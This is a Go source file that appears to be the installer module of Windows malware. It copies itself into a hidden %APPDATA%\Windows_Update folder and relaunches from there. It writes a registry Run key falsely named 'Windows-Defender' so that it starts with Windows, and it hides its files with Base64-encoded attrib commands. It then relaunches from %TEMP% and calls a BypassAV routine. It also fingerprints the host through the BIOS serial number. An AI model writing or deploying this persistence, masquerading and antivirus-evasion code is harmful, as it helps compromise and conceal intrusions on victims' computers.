package main

import (
	"os"
	"fmt"
	"github.com/cleversoap/go-cp"
	"crypto/md5"
)

func Install(){
	//Fist opened, Copy to home and change to that exe
	if GetExeName() != TARGET_FILE_NAME {
		//Install
		fmt.Println("1")
		err := os.RemoveAll(os.Getenv("APPDATA")+"\\Windows_Update"); if err != nil {fmt.Println(err.Error())}
		Run("mkdir %APPDATA%\\Windows_Update")
		cp.Copy(os.Args[0], os.Getenv("APPDATA")+"\\Windows_Update\\"+ TARGET_FILE_NAME)
		Run("start " + os.Getenv("APPDATA")+"\\Windows_Update\\"+ TARGET_FILE_NAME)		
		os.Exit(0)
	}

	//Sencond run, add regs keys and open from %TEMP%
	parent := GetParentFolder()
	if parent == "Windows_Update" {
		

		AddToStartUp()
		//REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V Windows_Update /t REG_SZ /F /D %APPDATA%\\Windows_Update\\
		Run("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V Windows-Defender /t REG_SZ /F /D %APPDATA%\\Windows_Update\\"+ TARGET_FILE_NAME)
	
		//atrib +H +S %APPDATA%\\Windows_Update\\
		Run(Base64Decode("YXR0cmliICtIICtTICVBUFBEQVRBJVxcV2luZG93c19VcGRhdGVcXA=="))
		Run(Base64Decode("YXR0cmliICtIICtTICVBUFBEQVRBJVxcV2luZG93c19VcGRhdGVcXA==")+ TARGET_FILE_NAME)
		//Start from differnt location to prevent exposing home dir
		
		path := os.Getenv("TEMP")+ "\\"+ TARGET_FILE_NAME
		//CP to other location
		cp.Copy(os.Args[0], path)
		//Run

		Run("start " + path)
		//Exit
		fmt.Println("2")

		os.Exit(0)
	}
	fmt.Println("3")

	//If already running start in wait mode
	//Else start copy

	//Third, BypassAV
	BypassAV();
}

func GetID() [16]byte{
	guid := RunRes("wmic bios get serialnumber")
	id := md5.Sum([]byte(guid)) //Id is 20 first of hash
	return id
}

